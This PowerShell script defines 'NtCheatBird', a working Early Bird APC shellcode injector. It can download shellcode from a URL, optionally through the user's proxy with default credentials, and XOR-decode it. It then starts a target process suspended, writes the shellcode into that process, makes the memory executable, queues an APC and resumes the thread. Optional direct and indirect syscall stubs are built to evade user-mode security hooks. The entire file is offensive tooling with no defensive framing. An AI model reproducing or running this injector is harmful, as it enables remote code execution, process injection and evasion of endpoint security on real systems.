function NtCheatBird {

    Param(
        $Shellcode,
        [UInt32]$XorKey,
        [string]$CreateProcess,
        [string]$ProcessArgs,
        [switch]$DirectSyscall,
        [switch]$IndirectSyscall,
        [switch]$UseProxy
    )


    # Error Correction
    if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }
    if (!$CreateProcess) { return (Write-Host '[!] Error! Missing target process to execute.' -ForegroundColor Red) }
    if (!(Get-Item -LiteralPath $CreateProcess 2>$NULL).FullName -and !(Get-Command -Name $CreateProcess 2>$NULL).Path) {
        return (Write-Host "[!] Error! Unable to locate process '${CreateProcess}'." -ForegroundColor Red)
    }


    # Internal Function(s)
    function Format-ByteArray ($Shellcode, [UInt32]$XorKey, [Bool]$UseProxy) {

        Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow

        if ($Shellcode -is [array]) {
            if ($Shellcode -is [Byte[]]) {
                Write-Host ' o  Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                Write-Host ' o  --> No formatting required.'
                $shellcodeBuffer = $Shellcode
            }
            else {
                Write-Host ' o  Shellcode parameter is an [array].'
                Write-Host ' o  --> Converting to [string]...'
                $Shellcode = $Shellcode -join ''
            }
        }

        if ($Shellcode -is [uri]) {
            Write-Host ' o  Shellcode parameter is a [uri].'
            Write-Host ' o  --> Converting to [string]...'
            $Shellcode = $Shellcode.AbsoluteUri
        }

        if ($Shellcode -is [String]) {
            $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')
            if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                Write-Host ' o  Shellcode [string] is a path to a file.'
                $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)
                Write-Host " o  --> Path : $ShellcodePath"
                Write-host ' o  --> Reading file bytes...'
            }
            elseif ($Shellcode -match "^(http://|https://)") {
                Write-Host ' o  Shellcode [string] is a URI.'
                Write-Host " o  --> URI : $Shellcode"
                Write-Host ' o  --> Downloading data...'
                Try {
                    if ($UseProxy) {
                        $WebClient     = [Net.WebClient]::new()
                        $Proxy         = [Net.WebProxy]::new()
                        $Proxy.Address = ([Net.WebRequest]::DefaultWebProxy.GetProxy($Shellcode)).AbsoluteUri
                        $Proxy.UseDefaultCredentials = $TRUE
                        $WebClient.Proxy = $Proxy
                        $ShellcodeBuffer = $WebClient.DownloadData($Shellcode)
                    }
                    else { $ShellcodeBuffer = [Net.WebClient]::new().DownloadData($Shellcode) }
                } 
                Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
            }
            elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
            }
            elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
            }
            else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
        }

        if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
        Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
        
        if ($XorKey) {
            Write-Host '[!] Applying XOR Cipher to Shellcode:' -ForegroundColor Yellow
            Write-Host " o  --> XOR Cipher Key : $('0x{0:X2}' -f ${XorKey}) (${XorKey})"
            for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i++) {
                $ShellcodeBuffer[$i] = $ShellcodeBuffer[$i] -bxor $XorKey
            }
        }

        return ,$shellcodeBuffer
    }
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [IntPtr]$FunctionAddress, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {

        if ($FunctionAddress) { $Library = 'Stub'}
        else {
            Try {
                if ($PSVersionTable.PSEdition -eq 'Core') {
                    $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                    if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                    $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                    if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
                }
                else {
                    $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                    $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                    $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                    $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                    $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                    if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                    $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                    if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
                }
            }
            Catch { return Generic-Error }
        }
         
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {
            Try {
                $DynAssembly        = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
                $AssemblyBuilder    = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder      = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
                $TypeBuilder        = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder      = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
                $FunctionDelegate   = $TypeBuilder.CreateType()
            }
            Catch { return Generic-Error }
        }

        Write-Host ' o  Function ' -NoNewline ; Write-Host "'${Library}!${FunctionName}()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {

        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($StructName, $False)
            if ($CustomType -ne $NULL) { return $CustomType }
        }

        Try {
            $DynAssembly     = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
            $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
            $Attributes      = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder     = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])
            foreach ($Member in $MembersObject) { [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public') }
            return $TypeBuilder.CreateType()
        }
        Catch { return Generic-Error }
    }
    function Syscall-Resolver ([string]$FunctionName, [switch]$Indirect) {

        Try {
            $Library = 'Ntdll.dll'
            if ($PSVersionTable.PSEdition -eq 'Core') {
                $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
            else {
                $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
        }
        Catch { return Generic-Error }

        $pNativeFunction = $FunctionAddress
        if ($Indirect) { $sysAddrNativeFunction = ($pNativeFunction -as [Int64]) + 0x12 }
  
        $lpBaseAddress = $pNativeFunction                     # Starting address to begin reading (e.g., address of NtAllocateVirtualMemory).
        $lpBuffer      = [Array]::CreateInstance([byte],0x15) # Buffer to receive contents 
        [System.Runtime.InteropServices.Marshal]::Copy($lpBaseAddress, $lpBuffer, 0, $lpBuffer.Length)

        $SSN          = [BitConverter]::ToUInt32($lpBuffer, 4)
        $sysAddrBytes = [BitConverter]::GetBytes($sysAddrNativeFunction)

        if ($Indirect) { $InvokeMethod = 'Indirect Syscall' }
        else           { $InvokeMethod = 'Direct Syscall'   }
    
        Write-Host '[!] Syscall Resolution:' -ForegroundColor Yellow
        Write-Host ' o  Target Library    -->  Ntdll.dll'
        Write-Host " o  Native Function   -->  ${FunctionName}"
        Write-Host " o  Invocation Method -->  ${InvokeMethod}"
        Write-Host " o  Function Address  -->  $(Print-Hex -Integer $pNativeFunction)"
        if ($Indirect) { Write-Host " o  Syscall Address   -->  $(Print-Hex -Integer $sysAddrNativeFunction)" }
        Write-Host " o  Syscall ID        -->  $(Print-Hex -Integer $SSN)"

        
        $SysCallStub  = @(0x49, 0x89, 0xCA)              # mov r10, rcx
        $SysCallStub += @(0xB8) + $lpBuffer[4..7]        # mov eax, <ssn>
        if ($Indirect) {
            $SysCallStub += @(0x49,0xBB) + $sysAddrBytes # mov r11, <syscall_addr>
            $SysCallStub += @(0x41,0xFF,0xE3)            # jmp r11
        }
        else {
            $SysCallStub += @(0x0F, 0x05)                # syscall
            $SysCallStub += @(0xC3)                      # ret
        }
    
        Write-Host '[!] Syscall Stub:' -ForegroundColor Yellow
        Write-Host '---'

        $StubLines = @()
        $StubLines += ($SysCallStub | % { Print-Hex -Integer $_ })[0..2] -join ' ' 
        $StubLines += ($SysCallStub | % { Print-Hex -Integer $_ })[3..7] -join ' '
        if ($Indirect) {
            $StubLines += ($SysCallStub | % { Print-Hex -Integer $_ })[8..17] -join ' '
            $StubLines += ($SysCallStub | % { Print-Hex -Integer $_ })[18..20] -join ' '
        }
        else {
            $StubLines += ($SysCallStub | % { Print-Hex -Integer $_ })[-3..-2] -join ' '
            $StubLines += Print-Hex -Integer $SysCallStub[-1]
        }

        $MaxLength = ($StubLines | Measure-Object -Maximum -Property Length).Maximum + 2
        
        Write-Host "    $($StubLines[0])$(' ' * ($MaxLength - $StubLines[0].Length))" -NoNewline -ForegroundColor Green
        Write-Host "; mov r10, rcx"
        Write-Host "    $($StubLines[1])$(' ' * ($MaxLength - $StubLines[1].Length))" -NoNewline -ForegroundColor Green
        Write-Host "; mov eax, $(Print-Hex -Integer $SSN)"

        if ($Indirect) {
            Write-Host "    $($StubLines[2])$(' ' * ($MaxLength - $StubLines[2].Length))" -NoNewline -ForegroundColor Green
            Write-Host "; mov r11, $(Print-Hex -Integer $sysAddrNativeFunction)"
            Write-Host "    $($StubLines[3])$(' ' * ($MaxLength - $StubLines[3].Length))" -NoNewline -ForegroundColor Green
            Write-Host "; jmp r11"
        }
        else {
            Write-Host "    $($StubLines[-2])$(' ' * ($MaxLength - $StubLines[-2].Length))" -NoNewline -ForegroundColor Green
            Write-Host "; syscall"
            Write-Host "    $($StubLines[-1])$(' ' * ($MaxLength - $StubLines[-1].Length))" -NoNewline -ForegroundColor Green
            Write-Host "; ret"
        }
        Write-Host '---'
        
        return $SysCallStub
    }
    function Generic-Error() {
        Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
        $Error[0]
        $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
        $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
        return
    }
    function Win32-Error() {
        return (Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)
    }
    function Print-Hex ($Integer) {
        return ('0x{0:x}' -f $Integer)
    }


    # Define Required Constant(s)
    $MemoryAllocation = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }
    $MemoryProtection = @{
        PAGE_EXECUTE_READ      = 0x20;
        PAGE_READWRITE         = 0x04;
    }
    $ProcessCreation = @{
        CREATE_SUSPENDED             = 0x00000004;
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    }


    # Define Required Struct(s)
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'cb'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpReserved'      ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpDesktop'       ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpTitle'         ; Type = [String] },
        [PSCustomObject]@{ Name = 'dwX'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwY'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFillAttribute' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFlags'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'wShowWindow'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'cbReserved2'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'lpReserved2'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdInput'       ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdOutput'      ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdError'       ; Type = [IntPtr] }
    )
    $StartupInfoType    = Build-Win32Struct -StructName "STARTUPINFOA" -MembersObject $StructMembers
    $StartupInfoTypeRef = $StartupInfoType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfo        = [STARTUPINFOA]::new()            # Used for Win32 function parameter(s)

    $StructMembers = @(
        [PSCustomObject]@{ Name = 'StartupInfo'     ; Type = $StartupInfoType },
        [PSCustomObject]@{ Name = 'lpAttributeList' ; Type = [IntPtr] }
    )
    $StartupInfoExType    = Build-Win32Struct -StructName "STARTUPINFOEXA" -MembersObject $StructMembers
    $StartupInfoExTypeRef = $StartupInfoExType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfoEx        = [STARTUPINFOEXA]::new()            # Used for Win32 function parameter(s)
    
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'hProcess'    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hThread'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'dwProcessId' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwThreadId'  ; Type = [Int32]  }
    )
    $ProcessInformationType    = Build-Win32Struct -StructName "PROCESS_INFORMATION" -MembersObject $StructMembers
    $ProcessInformationTypeRef = $ProcessInformationType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessInformation        = [PROCESS_INFORMATION]::new()            # Used for Win32 function parameter(s)

    $StructMembers = @(
        [PSCustomObject]@{ Name = 'nLength'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpSecurityDescriptor' ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'bInheritHandle'       ; Type = [Bool]   }
    )
    $SecurityAttributesType    = Build-Win32Struct -StructName "SECURITY_ATTRIBUTES" -MembersObject $StructMembers
    $SecurityAttributesTypeRef = $SecurityAttributesType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessAttributes         = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 1
    $ThreadAttributes          = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 2


    # Load Required Win32 API Call(s)
    Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow
    Try {
        $CreateProcArgs = @(
            [String],                   # lpApplicationName
            [String],                   # lpCommandLine
            $SecurityAttributesTypeRef, # lpProcessAttributes
            $SecurityAttributesTypeRef, # lpThreadAttributes
            [Bool],                     # bInheritHandles
            [Int32],                    # dwCreationFlags
            [IntPtr],                   # lpEnvironment
            [String],                   # lpCurrentDirectory
            $StartupInfoExTypeRef,      # lpStartupInfo
            $ProcessInformationTypeRef  # lpProcessInformation
        )
        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])

        $VirtualAllocExArgs = @(
            [IntPtr], # hProcess
            [IntPtr], # lpAddress
            [UInt32], # dwSize
            [UInt32], # flAllocationType
            [UInt32]  # flProtect
        )
        $VirtualAllocEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualAllocEx" -ParamTypes $VirtualAllocExArgs -ReturnType ([IntPtr])

        $WriteProcMemArgs = @(
            [IntPtr],                # hProcess
            [IntPtr],                # lpBaseAddress
            [byte[]],                # lpBuffer
            [UInt32],                # nSize
            [UInt32].MakeByRefType() # lpNumberOfBytesWritten
        )
        $WriteProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcMemArgs -ReturnType ([Bool])

        $VirtProtectExArgs = @(
            [IntPtr],                 # hProcess
            [IntPtr],                 # lpAddress
            [UInt32],                 # dwSize
            [UInt32],                 # flNewProtect
            [UInt32].MakeByRefType()  # lpflOldProtect
        )
        $VirtualProtectEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualProtectEx" -ParamTypes $VirtProtectExArgs -ReturnType ([Bool])
       
        if (!$DirectSyscall -and !$IndirectSyscall) {
            $NtQueueApcArgs = @(
                [IntPtr], # ThreadHandle
                [IntPtr], # ApcRoutine
                [IntPtr], # ApcArgument1
                [IntPtr], # ApcArgument2
                [IntPtr]  # ApcArgument3
            )
            $NtQueueApcThread =  Load-Win32Function -Library "Ntdll.dll" -FunctionName "NtQueueApcThread" -ParamTypes $NtQueueApcArgs -ReturnType ([UInt32]) # NTSTATUS
        }

        $ResThreadArgs = @(
            [IntPtr] # hThread
        )
        $ResumeThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ResumeThread" -ParamTypes $ResThreadArgs -ReturnType ([UInt32])
    }
    Catch { return Generic-Error }


    # Initialize Key Variables
    if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
    else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }
    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode -XorKey $XorKey -UseProxy $UseProxy
    if ($ShellcodeBuffer -isnot [byte[]]) { return }


    ### (1) ###
    Write-Host "[!] Creating target process..." -ForegroundColor Yellow

    $lpApplicationName    = $CreateProcess                            # Full path of the application to be executed.
    $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"         # Command line arguments to be executed  (full path + optional arguments).
    $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
    $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
    $bInheritHandles      = $False                                    # Boolean for new process to inherit handles from calling process.  
    $dwCreationFlags      = $ProcessCreation.CREATE_SUSPENDED -bor $ProcessCreation.EXTENDED_STARTUPINFO_PRESENT
    $lpEnvironment        = [IntPtr]::Zero                            # Pointer to the environment block for the new process.
    $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # Full path to the current directory for the process.
    $lpStartupInfo        = [ref]$StartupInfoEx                       # Pointer to STARTUPINFOEXA struct.
    $lpProcessInformation = [ref]$ProcessInformation                  # Pointer to PROCESS_INFORMATION struct.

    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
    Try   { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
    Catch { return Generic-Error }

    if (!$Success) { return Win32-Error }
    $RetProcessInformation = $lpProcessInformation.Value
    Write-Host " o  --> Process Path : ${CreateProcess}"
    Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"


    ### (2) ###
    Write-Host "[!] Allocating memory within '$($Createprocess.Split('\')[-1])' ($($RetProcessInformation.dwProcessId))..." -ForegroundColor Yellow
    $hProcess         = $RetProcessInformation.hProcess                                 # Handle to the target process.             
    $lpAddress        = [IntPtr]::Zero                                                  # Starting address in memory to allocate.        
    $dwSize           = $shellcodeBuffer.Length                                         # Size of the memory allocation in bytes.      
    $flAllocationType = $MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE # Flags for memory allocation type.
    $flProtect        = $MemoryProtection.PAGE_READWRITE                                # Memory protection flags for the allocated region.

    Write-Host ' o  ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green
    Try   { $ShellcodeAddr = $VirtualAllocEx.Invoke($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
    Catch { return Generic-Error }

    if ($ShellcodeAddr -eq 0) { return Win32-Error }
    Write-Host " o  --> Allocated Memory Address : $(Print-Hex $ShellcodeAddr)"
    Write-Host " o  --> Memory Block Size        : ${dwSize} bytes"
    Write-Host " o  --> Memory Protection        : 0x04 (PAGE_READWRITE)"


    ### (3) ###
    Write-Host "[!] Writing buffer to allocated memory..." -ForegroundColor Yellow

    $hProcess               = $RetProcessInformation.hProcess # Handle to the target process.
    $lpBaseAddress          = $ShellcodeAddr                  # Pointer to the starting address in memory to allocate. 
    $lpBuffer               = $shellcodeBuffer                # Buffer of bytes to copy/write.                
    $nSize                  = $shellcodeBuffer.Length         # Size of the buffer to copy.                      
    $lpNumberOfBytesWritten = 0                               # Output variable to receive number of bytes written.
    
    Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
    Try   { $MemoryCopied = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten) }
    Catch { return Generic-Error }

    if (!$MemoryCopied) { return Win32-Error }
    Write-Host " o  --> Successful wrote shellcode buffer."


    ### (4) ###
    Write-Host '[!] Changing memory buffer protection...' -ForegroundColor Yellow

    $hProcess       = $RetProcessInformation.hProcess     # Handle to the target process.   
    $lpAddress      = $ShellcodeAddr                      # Pointer to the starting address in memory to change.
    $dwSize         = $ShellcodeBuffer.Length             # Size of the target memory buffer in bytes.
    $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ # Memory protection flags for the specified region.
    $lpflOldProtect = 0                                   # Output variable to receive old memory protection flags.

    Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtectEx()' -ForegroundColor Green
    Try   { $Success = $VirtualProtectEx.Invoke($hProcess, $lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
    Catch { return Generic-Error }

    if (!$Success) { return Win32-Error }
    Write-Host ' o  --> Memory Protection : 0x20 (PAGE_EXECUTE_READ)'


    ### Optional ###
    if ($DirectSyscall -or $IndirectSyscall) {
        

        if ($DirectSyscall)   { $SyscallStub = Syscall-Resolver -FunctionName 'NtQueueApcThread' }
        if ($IndirectSyscall) { $SyscallStub = Syscall-Resolver -FunctionName 'NtQueueApcThread' -Indirect }

        Write-Host "[!] Allocating syscall stub into current process memory..." -ForegroundColor Yellow

        Write-Host ' o  --> ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green
        $hProcess         = [IntPtr](-1)                                                     # Handle to the target process (i.e., pseudo-handle).
        $lpAddress        = [IntPtr]::Zero                                                   # Starting address in memory to allocate (i.e., if null this is dynamically determined).
        $dwSize           = $SyscallStub.Length                                              # Size of the memory allocation in bytes.
        $flAllocationType = $MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE  # Flags for memory allocation type. 
        $flProtect        = $MemoryProtection.PAGE_READWRITE                                 # Memory protection flags for the allocated region.

        Try   { $StubAddress = $VirtualAllocEx.Invoke($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
        Catch { return Generic-Error }
        if ($StubAddress -eq 0) { return Win32-Error }

        Write-Host ' o  --> ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
        $hProcess               = [IntPtr](-1)        # Handle to the target process.                      
        $lpBaseAddress          = $StubAddress        # Starting address in memory to begin writing.        
        $lpBuffer               = $SyscallStub        # Pointer to the memory to copy.                      
        $nSize                  = $SyscallStub.Length # Size of the memory to copy.                         
        $lpNumberOfBytesWritten = 0                   # Output variable to receive number of bytes written.
    
        Try   { $MemoryCopied = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten) }
        Catch { return Generic-Error }
        if (!$MemoryCopied) { return Win32-Error }

        Write-Host ' o  --> ' -NoNewline; Write-Host 'VirtualProtectEx()' -ForegroundColor Green
        $hProcess       = [IntPtr](-1)                        # Handle to the target process.   
        $lpAddress      = $StubAddress                        # Pointer to the starting address in memory to change.
        $dwSize         = $SysCallStub.Length                 # Size of the target memory buffer in bytes.
        $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ # Memory protection flags for the specified region.
        $lpflOldProtect = 0                                   # Output variable to receive old memory protection flags.

        Try   { $Success = $VirtualProtectEx.Invoke($hProcess, $lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
        Catch { return Generic-Error }
        if (!$Success) { return Win32-Error }

        Write-Host '[!] Loading syscall via allocated stub...' -ForegroundColor Yellow
        $NtQueueApcArgs = @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])
        $NtQueueApcThread =  Load-Win32Function -FunctionName 'NtQueueApcThread' -FunctionAddress $StubAddress -ParamTypes $NtQueueApcArgs -ReturnType ([UInt32]) # NTSTATUS
    }
    

    ### (5) ###
    Write-Host '[!] Queueing thread via APC...' -ForegroundColor Yellow

    $ThreadHandle = $RetProcessInformation.hThread # Handle to the target thread which to queue the APC.
    $ApcRoutine   = $ShellcodeAddr                 # Pointer to custom APC routine to be executed (i.e., shellcode address).
    $ApcArgument1 = [IntPtr]::Zero                 # Optional first argument to pass to the APC routine.
    $ApcArgument2 = [IntPtr]::Zero                 # Optional second argument to pass to the APC routine.
    $ApcArgument3 = [IntPtr]::Zero                 # Optional third argument to pass to the APC routine.
    
    Write-Host ' o  ' -NoNewline; Write-Host 'NtQueueApcThread()' -ForegroundColor Green
    Try   { $NTSTATUS = $NtQueueApcThread.Invoke($ThreadHandle, $ApcRoutine, $ApcArgument1, $ApcArgument2, $ApcArgument3) }
    Catch { return Generic-Error }
    
    if ($NTSTATUS -ne 0) { return Win32-Error }
    Write-Host ' o  --> Successfully added APC queue.'


    ### (6) ###
    Write-Host "[!] Resuming process execution..." -ForegroundColor Yellow

    $hThread = $RetProcessInformation.hThread  # Handle to the target thread.

    Write-Host ' o  ' -NoNewline ; Write-Host 'ResumeThread()' -ForegroundColor Green
    Try   { $Success = $ResumeThread.Invoke($hThread) }
    Catch { return Generic-Error }

    if ($Success -ne 1) { return Win32-Error }     
    Write-Host " o  --> Thread Handle : ${hThread}"
}